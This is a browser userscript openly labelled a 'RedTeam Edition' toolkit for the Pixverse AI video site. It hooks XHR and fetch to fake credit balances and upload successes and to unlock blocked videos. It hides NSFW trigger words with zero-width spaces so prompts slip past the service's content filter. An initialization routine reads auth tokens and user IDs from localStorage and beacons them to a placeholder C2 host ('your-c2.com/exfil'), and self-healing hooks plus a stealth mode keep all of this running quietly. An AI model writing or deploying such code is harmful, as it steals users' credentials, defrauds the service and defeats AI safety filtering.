// ==UserScript==
// @name        4ndr0tools - Pixverse++ (RedTeam Edition)
// @namespace   https://github.com/4ndr0666/userscripts
// @author      4ndr0666
// @version     2.3.4 // Incrementing version to reflect new combined features
// @description Redteam pentesting bypass & toolkit: credits patch, video/status unlock, robust download, NSFW bypass, anti-blockers, stealth mode, self-healing, inline uBO bullshit filters, and covert data exfiltration.
// @match       https://app.pixverse.ai/*
// @downloadURL https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++%20(RedTeam%20Edition).user.js
// @updateURL   https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++%20(RedTeam%20Edition).user.js
// @icon        https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
// @run-at      document-start
// @grant       none
// @license     MIT
// ==/UserScript==

(() => {
  'use strict';

  // Prevent multiple initializations of the script if it somehow gets loaded more than once.
  if (window._pixverseToolkitInitialized) {
    return;
  }
  window._pixverseToolkitInitialized = true;

  //────── CONFIGURATION & CONSTANTS ──────//

  // Set DEBUG_MODE to true during development/testing for console logs and toast notifications.
  // Set to false for stealthy red team deployment.
  const DEBUG_MODE = false; // <<< IMPORTANT: Set to 'false' for production stealth >>>

  const DEBUG_PREFIX = '[Pixverse++]'; // Used only if DEBUG_MODE is true
  const MAX_DOM_ATTEMPTS = 30; // Max attempts for DOM element observation (e.g., download button)
  const SELF_HEALING_INTERVAL_MS = 5000; // Base interval for self-healing checks
  const SELF_HEALING_JITTER_MS = 1000; // Max random jitter for self-healing interval

  let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
  let isInitialized = false; // Flag to ensure core overrides are run only once
  let btnAttached = false; // Flag to track if the custom download button handler has been attached

  // --- C2 Configuration for Covert Data Exfiltration ---
  // IMPORTANT: Replace 'https://your-c2.com' with your actual controlled server domain for live use.
  // Your server should be configured to receive GET requests at the /exfil path and log the parameters.
  // If left as placeholder, exfiltration attempts will fail silently (or log errors if DEBUG_MODE is true).
  const C2_SERVER_DOMAIN = 'https://your-c2.com';

  // --- References to your custom overridden functions for self-healing ---
  // These will store the function pointers to your overridden XMLHttpRequest.prototype.open
  // and window.fetch so you can check if they've been replaced by other scripts.
  let myCustomXhrOpen = null;
  let myCustomFetch = null;

  // List of words to obfuscate in prompts to bypass NSFW filters.
  const TRIGGER_WORDS = [
    "anal","asshole","anus","areola","areolas","blowjob","boobs","bounce","bouncing","breast","breasts",
    "bukake","buttcheeks","butt","cheeks","climax","clit","cleavage","cock","corridas","crotch","cum","cums","culo","cunt",
    "deep","deepthroat","ddick","dick","esperma","fat ass","fellatio","fingering","fuck","fucking","fucked","horny","lick","masturbate",
    "masterbating","member","meco","moan","moaning","nipple","nsfw","oral","orgasm","penis","phallus","pleasure",
    "pussy","rump","semen","slut","slutty","splooge","squeezing","squeeze","suck","sucking","swallow","throat","throating",
    "tits","tit","titty","titfuck","titties","tittydrop","tittyfuck","titfuck","vagina","wiener","whore","creampie","cumshot","cunnilingus",
    "doggystyle","ejaculate","ejaculation","handjob","jerk off","labia","nude","orgy","porn","prolapse",
    "rectum","rimjob","sesual","stripper","submissive","teabag","threesome","vibrator","voyeur", "whore" // Ensure 'whore' is included
  ];

  // API endpoints to intercept and modify. Regular expressions are used for flexible matching.
  const API_ENDPOINTS = {
    credits:        /\/user\/credits(?:\?|$)/, // Matches /user/credits or /user/credits?param=value
    videoList:      /\/video\/list\/personal/,
    batchUpload:    /\/media\/batch_upload_media/,
    singleUpload:   /\/media\/upload/,
    creativePrompt: /\/creative_platform\/video\// // Endpoint for submitting video generation prompts
  };

  //────── HELPERS ──────//

  /**
   * Logs messages to the console with a consistent prefix. Only logs if DEBUG_MODE is true.
   * @param {...any} args - Arguments to log.
   */
  function log(...args) {
    if (DEBUG_MODE) {
      console.log(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Logs error messages to the console with a consistent prefix. Only logs if DEBUG_MODE is true.
   * @param {...any} args - Arguments to log.
   */
  function error(...args) {
    if (DEBUG_MODE) {
      console.error(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Exfiltrates data covertly using an image beacon.
   * This attempts exfiltration regardless of DEBUG_MODE, but logs errors only if DEBUG_MODE is true.
   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
   * @param {string} dataPayload - The actual data to exfiltrate.
   */
  function exfiltrateData(dataType, dataPayload) {
    // Prevent exfiltration if C2_SERVER_DOMAIN is not properly set (or is the placeholder).
    if (!C2_SERVER_DOMAIN || C2_SERVER_DOMAIN === 'https://your-c2.com') {
      error("C2_SERVER_DOMAIN not configured or set to placeholder. Data exfiltration skipped."); // Log only if DEBUG_MODE.
      return;
    }
    try {
      const beacon = new Image();
      // Construct the URL: your C2 server, a path to identify the data type, and the encoded payload.
      // The timestamp helps prevent caching and adds a bit of uniqueness.
      beacon.src = `${C2_SERVER_DOMAIN}/exfil?type=${encodeURIComponent(dataType)}&data=${encodeURIComponent(dataPayload)}&_t=${Date.now()}`;
      // No need to append to DOM, just setting src triggers the request.
      log(`Data exfiltration initiated for type: ${dataType}`); // Log only if DEBUG_MODE.
    } catch (e) {
      error(`Failed to exfiltrate data of type ${dataType}:`, e); // Log only if DEBUG_MODE.
    }
  }

  /**
   * Helper function to escape special characters in a string for use in a RegExp constructor.
   * @param {string} str - The string to escape.
   * @returns {string} - The escaped string.
   */
  function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); // Correctly escapes by inserting the matched character.
  }

  // Pre-compile a single regex for efficient NSFW prompt obfuscation using the corrected escape function.
  const NSFW_PROMPT_REGEX = new RegExp(
    `\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`, // Combines all words with OR (?:...) for non-capturing group
    "gi" // Global and case-insensitive flags
  );

  /**
   * Checks if a given URL matches a predefined API endpoint using its regex.
   * @param {string} url - The URL to test.
   * @param {string} key - The key of the API endpoint in API_ENDPOINTS (e.g., "credits", "videoList").
   * @returns {boolean} - True if the URL matches the endpoint, false otherwise.
   */
  function matchesEndpoint(url, key) {
    return API_ENDPOINTS[key]?.test(url);
  }

  /**
   * Parses a request body (either FormData or a JSON string) into a JavaScript object.
   * @param {FormData|string} body - The request body.
   * @returns {object|null} - The parsed object, or null if parsing fails or body type is unsupported.
   */
  function parseBody(body) {
    if (body instanceof FormData) {
      try {
        return Object.fromEntries(body);
      } catch (e) {
        error("Failed to parse FormData:", e); // Log only if DEBUG_MODE.
        return null;
      }
    }
    if (typeof body === "string") {
      try {
        return JSON.parse(body);
      } catch (e) {
        error("Failed to parse JSON string:", e); // Log only if DEBUG_MODE.
        return null;
      }
    }
    return null; // Return null for unsupported body types
  }

  /**
   * Obfuscates trigger words in a prompt by inserting zero-width spaces (`\u200B`).
   * Uses the pre-compiled regex for efficiency.
   * @param {string} prompt - The original prompt string.
   * @returns {string} - The obfuscated prompt string.
   */
  function obfuscatePrompt(prompt) {
    return prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').join('\u200B'));
  }

  /**
   * Extracts a media path from an API request body, specifically for upload endpoints.
   * @param {object} data - The request data object.
   * @param {string} url - The URL of the request, used to determine the endpoint type.
   * @returns {string|null} - The extracted media path (e.g., "path/to/video.mp4"), or null if not found.
   */
  function extractMediaPath(data, url) {
    if (!data || typeof data !== "object") {
      return null;
    }
    if (matchesEndpoint(url, "batchUpload") && Array.isArray(data.images)) {
      return data.images[0]?.path || null;
    }
    if (matchesEndpoint(url, "singleUpload")) {
      if (typeof data.path === "string") return data.path;
      if (typeof data.media_path === "string") return data.media_path;
      // Fallback: look for any string property that looks like an MP4 path.
      for (const k in data) {
        // Use hasOwnProperty to avoid iterating over prototype chain properties.
        if (Object.prototype.hasOwnProperty.call(data, k) && typeof data[k] === "string" && /\.mp4$/i.test(data[k])) {
          return data[k];
        }
      }
    }
    return null;
  }

  /**
   * Sanitizes a string for use as a filename.
   * Removes invalid filename characters, leading/trailing dots/spaces, and truncates.
   * @param {string} str - The input string.
   * @returns {string} - The sanitized filename string.
   */
  function sanitize(str) {
    return String(str)
      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_") // Replace invalid characters with underscore
      .replace(/^\.+/, '') // Remove leading dots
      .replace(/\.+$/, '') // Remove trailing dots
      .replace(/^\s+|\s+$/g, '') // Trim leading/trailing whitespace
      .slice(0, 120); // Safety truncation to prevent excessively long filenames
  }

  /**
   * Generates a suitable filename for a video element.
   * Prioritizes extracting a title from the DOM, then falls back to a URL-based guess.
   * @param {HTMLVideoElement} videoEl - The video element from which to derive the filename.
   * @param {string} fallback - A default filename to use if no better name can be determined.
   * @returns {string} - The generated and sanitized filename.
   */
  function getFilename(videoEl, fallback = "video.mp4") {
    let src = (videoEl?.currentSrc || videoEl?.src || fallback);
    let guess = (src.split("/").pop() || fallback).split("?")[0]; // Get filename from URL, remove query params

    let title = "";
    try {
      // Attempt to find a title from common parent containers of the video player
      let container = videoEl.closest(".component-video,.pv-video-detail-page");
      title = container?.querySelector("h2, .title, .pv-title")?.textContent?.trim() || "";
    } catch (e) {
      error("Error extracting title for filename:", e); // Log only if DEBUG_MODE.
    }

    if (title) {
      return sanitize(title) + ".mp4";
    }
    return sanitize(guess);
  }

  /**
   * Simple throttle function to limit how often a function can be called.
   * Introduces a small random jitter to the delay for stealth.
   * @param {Function} fn - The function to throttle.
   * @param {number} baseDelay - The minimum base delay in milliseconds.
   * @param {number} [jitter=100] - Max random milliseconds to add to the baseDelay.
   * @returns {Function} - The throttled function.
   */
  function throttle(fn, baseDelay, jitter = 100) {
    let last = 0, timeoutId;
    return function(...args) {
      const now = Date.now();
      const currentDelay = baseDelay + Math.random() * jitter;
      if (now - last < currentDelay) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => {
          last = Date.now();
          fn.apply(this, args);
        }, currentDelay - (now - last));
      } else {
        last = now;
        fn.apply(this, args);
      }
    };
  }

  /**
   * Displays a transient toast notification at the bottom center of the screen.
   * Only displays if DEBUG_MODE is true.
   * @param {string} msg - The message to display.
   * @param {number} [duration=3500] - Duration in milliseconds before fade out.
   */
  function showToast(msg, duration = 3500) {
    if (!DEBUG_MODE) return;

    document.querySelectorAll(".pv-toast").forEach(e => e.remove());

    const el = document.createElement("div");
    el.className = "pv-toast";
    el.textContent = msg;

    Object.assign(el.style, {
      position: "fixed", bottom: "22px", left: "50%",
      transform: "translateX(-50%)", background: "rgba(20,40,48,0.94)",
      color: "#15FFFF", padding: "8px 20px", borderRadius: "6px",
      font: "15px/1.2 sans-serif", zIndex: "299999",
      opacity: "0", transition: "opacity .25s ease-in-out",
      pointerEvents: "none"
    });

    document.body.appendChild(el);
    requestAnimationFrame(() => el.style.opacity = "1");
    setTimeout(() => {
      el.style.opacity = "0";
      el.addEventListener("transitionend", () => el.remove(), { once: true });
    }, duration);
  }

  //────── API PATCHERS ──────//

  /**
   * Modifies the user credits response to always show 100 credits.
   * Includes an example for data exfiltration.
   * @param {object} data - The original response data.
   * @returns {object|null} - The modified data, or null if the structure doesn't match.
   */
  function tryModifyCredits(data) {
    if (data?.Resp?.credits !== undefined) {
      const clone = structuredClone(data);
      clone.Resp.credits = 100;
      log('Credits restored to 100'); // Log only if DEBUG_MODE.
      // Example: Exfiltrate user ID if available in the credits response.
      if (data.Resp?.user_id) {
          exfiltrateData("user_id_from_credits", data.Resp.user_id.toString());
      }
      return clone;
    }
    return null;
  }

  /**
   * Modifies the video list response to unlock video status (e.g., from blocked to ready)
   * and bypass NSFW placeholder images by pointing directly to the video path.
   * @param {object} data - The original response data.
   * @returns {object} - The modified data. Returns original data if structure is unexpected.
   */
  function modifyVideoList(data) {
    if (!data?.Resp?.data) {
      return data;
    }

    // List of strings commonly found in NSFW placeholder URLs. Renamed for clarity.
    const NSFW_URL_KEYWORDS = [
      "/nsfw", "/forbidden", "placeholder", "blocked", "ban", "pixverse-ban"
    ];

    function isNSFWPlaceholder(url) {
      if (!url) return false;
      return NSFW_URL_KEYWORDS.some(p => url.includes(p));
    }

    const clone = structuredClone(data);
    clone.Resp.data = clone.Resp.data.map(item => {
      // Change video_status 7 (e.g., blocked/failed) to 1 (e.g., success/ready).
      if (item.video_status === 7) {
        item.video_status = 1;
      }

      let previewUrl =
        (item.extended === 1 && item.customer_paths?.customer_video_last_frame_url) ||
        item.customer_paths?.customer_img_url ||
        '';

      if (isNSFWPlaceholder(previewUrl) && item.video_path) {
        item.first_frame = `https://media.pixverse.ai/${item.video_path}#t=0.2`;
      } else if (previewUrl) {
        item.first_frame = previewUrl;
      } else if (item.video_path) {
        item.first_frame = `https://media.pixverse.ai/${item.video_path}#t=0.2`;
      } else {
        item.first_frame = previewUrl; // Fallback
      }
      item.url = item.video_path ? `https://media.pixverse.ai/${item.video_path}` : '';
      return item;
    });
    return clone;
  }

  /**
   * Generates a mock success response for batch media uploads based on a saved media path.
   * @param {string} mediaPath - The media path to include in the mock response.
   * @returns {object} The mock success response.
   */
  function generateBatchUploadSuccessResponse(mediaPath) {
    const id = Date.now();
    const name = mediaPath.split('/').pop() || 'uploaded_media';
    return {
      ErrCode:0, ErrMsg:"success", Resp:{ result:[{ id, category:0, err_msg:"",
        name, path:mediaPath, size:0,
        url:`https://media.pixverse.ai/${mediaPath}` }] }
    };
  }

  /**
   * Generates a mock success response for single media uploads based on a saved media path.
   * @param {string} mediaPath - The media path to include in the mock response.
   * @returns {object} The mock success response.
   */
  function generateSingleUploadSuccessResponse(mediaPath) {
    const name = mediaPath.split('/').pop() || 'uploaded_media';
    return {
      ErrCode:0, ErrMsg:"success", Resp:{
        path:mediaPath,
        url:`https://media.pixverse.ai/${mediaPath}`,
        name: name,
        type:1
      }
    };
  }

  /**
   * Central function to apply appropriate response modifications based on the request URL.
   * @param {object} data - The original response data.
   * @param {string} url - The URL of the request.
   * @returns {object|null} - The modified data, or null if no modification was applied.
   */
  function modifyResponse(data, url) {
    if (!data || typeof data !== "object") return null;

    if (matchesEndpoint(url, "credits")) {
      const modified = tryModifyCredits(data);
      if (modified) return modified;
    }

    if (matchesEndpoint(url, "videoList")) {
      return modifyVideoList(data); // This always returns a modified (or original) data object.
    }

    // Determine common error codes for upload bypass
    const uploadErrorCodes = [400, 403, 401, 400040, 500063];
    // Apply upload bypass logic only if server returns an error AND we have a saved path.
    if (uploadErrorCodes.includes(data?.ErrCode) && savedMediaPath) {
      log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`); // Log only if DEBUG_MODE.
      if (matchesEndpoint(url, "batchUpload")) {
        return generateBatchUploadSuccessResponse(savedMediaPath);
      } else if (matchesEndpoint(url, "singleUpload")) {
        return generateSingleUploadSuccessResponse(savedMediaPath);
      }
    } else if (data?.ErrCode !== undefined && data.ErrCode !== 0) {
      // Log if an error occurred for an upload, but we couldn't fake it (e.g., no savedMediaPath).
      error(`Upload error for ${url}, but faking not applied. ErrCode: ${data.ErrCode}, savedMediaPath: ${savedMediaPath}`); // Log only if DEBUG_MODE.
    }

    return null; // No applicable modification found.
  }

  //────── INTERCEPTORS (STEALTH) ──────//

  /**
   * Overrides XMLHttpRequest.prototype.open and .send methods to intercept and modify requests/responses.
   */
  function overrideXHR() {
    const oOpen = XMLHttpRequest.prototype.open;
    const oSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(m, u) {
      this._url = u;
      this._method = m;
      return oOpen.apply(this, arguments);
    };
    myCustomXhrOpen = XMLHttpRequest.prototype.open; // Store reference for self-healing.

    XMLHttpRequest.prototype.send = function(body) {
      const url = this._url || "";
      const method = (this._method || "GET").toUpperCase();
      let modifiedBody = body;

      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          let obj = (typeof body === "string") ? JSON.parse(body) : body;
          if (obj && typeof obj === 'object' && obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            modifiedBody = JSON.stringify(obj);
            log('XHR prompt obfuscated for:', url); // Log only if DEBUG_MODE.
          }
        } catch (e) {
          error("Error obfuscating XHR prompt:", e); // Log only if DEBUG_MODE.
        }
      }

      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) {
          savedMediaPath = p;
          log('Saved media path from XHR upload:', savedMediaPath); // Log only if DEBUG_MODE.
        }
      }

      this.addEventListener("load", () => {
        if (this.status >= 200 && this.status < 300) {
          let resp;
          try {
            resp = this.responseType === "json" ? this.response : JSON.parse(this.responseText || "{}");
          } catch (e) {
            error("Error parsing XHR response:", e); // Log only if DEBUG_MODE.
            resp = null;
          }

          if (resp !== null) {
            const modifiedResponse = modifyResponse(resp, url);
            if (modifiedResponse) {
              Object.defineProperties(this, {
                response: { value: modifiedResponse, writable: false, configurable: true },
                responseText: { value: JSON.stringify(modifiedResponse), writable: false, configurable: true }
              });
              log('XHR response modified for:', url); // Log only if DEBUG_MODE.
            }
          }
        }
      }, { once: true });
      return oSend.apply(this, [modifiedBody]);
    };
    log('XHR override initialized'); // Log only if DEBUG_MODE.
  }

  /**
   * Overrides the native window.fetch method to intercept and modify requests and responses.
   */
  function overrideFetch() {
    const origFetch = window.fetch;

    window.fetch = async function(...args) {
      const url = typeof args[0] === "string" ? args[0] : args[0]?.url || "";
      let init = args[1] || {};
      const method = (init.method || "GET").toUpperCase();
      let body = init.body;

      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          let obj = (typeof body === "string") ? JSON.parse(body) : body;
          if (obj && typeof obj === 'object' && obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            init = { ...init, body: JSON.stringify(obj) };
            args[1] = init;
            body = init.body;
            log('Fetch prompt obfuscated for:', url); // Log only if DEBUG_MODE.
          }
        } catch (e) {
          error("Error obfuscating Fetch prompt:", e); // Log only if DEBUG_MODE.
        }
      }

      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) {
          savedMediaPath = p;
          log('Saved media path from Fetch upload:', savedMediaPath); // Log only if DEBUG_MODE.
        }
      }

      try {
        const res = await origFetch.apply(this, args);
        const contentType = res.headers.get("content-type") || "";

        if (contentType.includes("application/json")) {
          const clone = res.clone();
          let json;
          try { json = await clone.json(); } catch (e) {
            error("Error parsing Fetch response JSON:", e); // Log only if DEBUG_MODE.
            json = null;
          }

          if (json !== null) {
            const modifiedResponse = modifyResponse(json, url);
            if (modifiedResponse) {
              const modifiedBodyString = JSON.stringify(modifiedResponse);
              const headers = new Headers(res.headers);
              headers.set("Content-Type", "application/json");
              // IMPORTANT: Update Content-Length header for consistency.
              headers.set("Content-Length", new TextEncoder().encode(modifiedBodyString).length.toString());

              log('Fetch response modified for:', url); // Log only if DEBUG_MODE.
              return new Response(modifiedBodyString, {
                status: res.status, statusText: res.statusText, headers: headers
              });
            }
          }
        }
        return res;
      } catch (err) {
        error("Fetch error for", url, err); // Log only if DEBUG_MODE.
        throw err;
      }
    };
    myCustomFetch = window.fetch; // Store reference for self-healing.
    log('Fetch override initialized'); // Log only if DEBUG_MODE.
  }

  //────── ANTI-BLOCKER & UI REPURPOSING ──────//

  /**
   * Overrides context menu blocking mechanisms on the page.
   * It intercepts `addEventListener` calls to block `contextmenu` events
   * and uses a `MutationObserver` to remove `oncontextmenu` attributes from elements.
   */
  function overrideContextMenuBlockers() {
    const originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, handler, options) {
      if (type === "contextmenu") {
        log("Blocked contextmenu listener:", this, handler); // Log only if DEBUG_MODE.
        return;
      }
      return originalAddEventListener.apply(this, arguments);
    };

    new MutationObserver(mutations => {
      mutations.forEach(mutation => mutation.addedNodes.forEach(node => {
        if (node.nodeType === Node.ELEMENT_NODE) {
          if (node.hasAttribute("oncontextmenu")) node.removeAttribute("oncontextmenu");
          node.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
        }
      }));
    }).observe(document.documentElement, { childList: true, subtree: true });

    document.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
    log('Anti-contextmenu enabled'); // Log only if DEBUG_MODE.
  }

  /**
   * Injects custom CSS rules to hide specific UI elements, mimicking uBlock Origin filters.
   * This is always active for a minimal UI footprint in production.
   * WARNING: Selectors are highly specific and may break with website updates.
   */
  function injectUboCssFilters() {
    const cssRules = [
      ".top-14.gap-1.items-center.flex.bg-background-primary.py-2.px-4.sticky.z-20",
      ".overflow-hidden.rounded-xl.aspect-video.w-full", // This might be too broad; review if it hides desired elements.
      ".gap-9.flex-col.flex.max-lg\\:p-4.p-6.w-full",
      ".relative.cursor-pointer.flex-row.rounded-full.px-3.gap-1\\.5.text-xs.h-8.hover\\:text-text-white-primary.hover\\:bg-button-secondary-hover.border-border-third.border-solid.border-t.text-text-white-secondary.backdrop-blur-\\[32px\\].bg-button-secondary-normal.items-center.justify-center.flex.border-0.text-nowrap.font-medium.group\\/button",
      "#radix-\\:r1a\\:", "#radix-\\:r1g\\:", "#radix-\\:r1h\\:", "#radix-\\:r1b\\:", // Radix UI dynamic IDs - highly unstable.
      ".intercom-lightweight-app-launcher-icon-open.intercom-lightweight-app-launcher-icon", // Intercom chat.
      ".intercom-launcher.intercom-lightweight-app-launcher",
      ".absolute.top-0.left-0.right-0.bg-black.bg-opacity-30.pointer-events-none", // Overlays.
      ".fixed.z-50.inset-0.flex.items-center.justify-center",
      ".bg-primary-50", ".bg-secondary-50",
      ".gap-2.flex-col.flex.py-2",
      ".flex-col.flex.w-full.flex-1 > .gap-2.flex-col.flex.w-full",
      "#image_text-advanced > .hover\\:text-text-white-primary.text-text-white-secondary.pr-6.px-3.gap-1\\.5.items-center.justify-center.shrink-0.flex.h-full.relative",
      "#image_text-quality > .hover\\:text-text-white-primary.text-text-white-secondary.pr-6.px-3.gap-1\\.5.items-center.justify-center.shrink-0.flex.h-full.relative"
    ];
    // Asset/image block (e.g., footer images)
    const assetRules = [
      'img[src*="media.pixverse.ai/asset/media/footer_earned_bg.png?x-oss-process=style/cover-webp-small"]'
    ];
    const styleElement = document.createElement("style");
    styleElement.id = "ubo-pixverse-css";
    styleElement.textContent = [
      ...cssRules.map(selector => `:root ${selector}{display:none!important;}`),
      ...assetRules.map(selector => `${selector}{display:none!important;}`)
    ].join("\n");
    document.head.appendChild(styleElement);
    log('UBO CSS filters injected'); // Log only if DEBUG_MODE.
  }

  /**
   * Sets up a robust download handler for the existing "Download" button on the page.
   * It uses a MutationObserver to detect when the button becomes available in the DOM,
   * and throttles attempts to attach the handler with randomized delays.
   */
  function setupWatermarkButton() {
    if (btnAttached) return;
    let attemptCount = 0;

    const throttledTryAttach = throttle(tryAttachButton, 300, 100);

    function tryAttachButton() {
      let mainContent = document.querySelector('#main-content,[role="main"]') || document.body;
      let allBtns = mainContent.querySelectorAll("button");

      for (let btn of allBtns) {
        let labelDiv = Array.from(btn.querySelectorAll("div")).find(d => d.textContent && d.textContent.trim() === "Download");
        if (labelDiv && !btn.dataset.injected) {
          btn.addEventListener("click", e => {
            e.stopPropagation(); // Prevent the original button's click handler from executing.
            const videoEl = document.querySelector(".component-video>video,video");
            if (videoEl?.src) {
              const url = videoEl.currentSrc || videoEl.src;
              const filename = getFilename(videoEl);
              const a = document.createElement("a");
              a.href = url;
              a.download = filename;
              document.body.appendChild(a);
              a.click();
              a.remove();
              showToast("Download started!"); // Only shows if DEBUG_MODE is true.
            } else {
              showToast("No video found to download."); // Only shows if DEBUG_MODE is true.
            }
          }, true);
          btn.dataset.injected = "1";
          btnAttached = true;
          log('Canonical Download button injected'); // Log only if DEBUG_MODE.
          // No break here, in case multiple "Download" buttons need their handlers overridden.
        }
      }

      if (!btnAttached && attemptCount < MAX_DOM_ATTEMPTS) {
        attemptCount++;
        setTimeout(throttledTryAttach, 350 + Math.random() * 50); // Schedule next attempt with jitter.
      }
    }

    let observerTarget = document.querySelector('#main-content,[role="main"]') || document.body;
    const observer = new MutationObserver(throttledTryAttach);
    observer.observe(observerTarget, { childList: true, subtree: true });

    tryAttachButton(); // Initial attempt to attach the button handler.
    log('Watermark button setup initialized'); // Log only if DEBUG_MODE.
  }

  //────── SELF-HEALING ──────//

  /**
   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
   * Periodically checks if the overrides are still active and reapplies them if they've been replaced.
   */
  function setupSelfHealingHooks() {
    setInterval(() => {
      // Check if our XHR hook is still in place.
      if (myCustomXhrOpen && XMLHttpRequest.prototype.open !== myCustomXhrOpen) {
        log('XHR hook detected as overwritten, re-applying...'); // Log only if DEBUG_MODE.
        overrideXHR();
      }
      // Check if our Fetch hook is still in place.
      if (myCustomFetch && window.fetch !== myCustomFetch) {
        log('Fetch hook detected as overwritten, re-applying...'); // Log only if DEBUG_MODE.
        overrideFetch();
      }
    }, SELF_HEALING_INTERVAL_MS + Math.random() * SELF_HEALING_JITTER_MS);
    log('Self-healing hooks initialized'); // Log only if DEBUG_MODE.
  }

  //────── INITIALIZATION ──────//

  /**
   * Initializes all toolkit functionalities. Ensures that initialization happens only once.
   */
  function initialize() {
    if (isInitialized) {
      return;
    }
    try {
      overrideContextMenuBlockers();
      overrideXHR();
      overrideFetch();
      injectUboCssFilters(); // Always active for stealth.
      setupWatermarkButton();
      setupSelfHealingHooks();

      // Example: Read from local storage and attempt to exfiltrate data on initialization.
      try {
        const userId = localStorage.getItem('pixverse_user_id'); // Placeholder key, adapt as needed.
        if (userId) {
          log('Found potential user ID in local storage:', userId); // Log only if DEBUG_MODE.
          exfiltrateData("local_storage_user_id", userId);
        }
        const token = localStorage.getItem('pixverse_auth_token'); // Placeholder key, adapt as needed.
        if (token) {
          log('Found potential auth token in local storage:', token); // Log only if DEBUG_MODE.
          exfiltrateData("local_storage_auth_token", token);
        }
      } catch (e) {
        error("Error accessing local storage during initialization:", e); // Log only if DEBUG_MODE.
      }

      isInitialized = true;
      log('Pixverse++ initialized'); // Log only if DEBUG_MODE.
      showToast('Pixverse++ Toolkit loaded ✓'); // Only shows if DEBUG_MODE is true.
    } catch (e) {
      error('Initialization failed:', e); // Log only if DEBUG_MODE.
      showToast('Pixverse++ init error'); // Only shows if DEBUG_MODE is true.
    }
  }

  // Determine when to initialize the script based on document readiness.
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize, { once: true });
  } else {
    initialize();
  }

  // Immediately-invoked function to inject minimal CSS for the toast notification.
  // This CSS is ONLY injected if DEBUG_MODE is true.
  (function() {
    if (!DEBUG_MODE) return;
    if (document.getElementById("pv-toast-css")) {
      return;
    }
    const styleElement = document.createElement("style");
    styleElement.id = "pv-toast-css";
    styleElement.textContent = `
      .pv-toast{
        box-sizing:border-box;
        user-select:none;
        pointer-events:none;
      }
    `;
    document.head.appendChild(styleElement);
  })();

})();
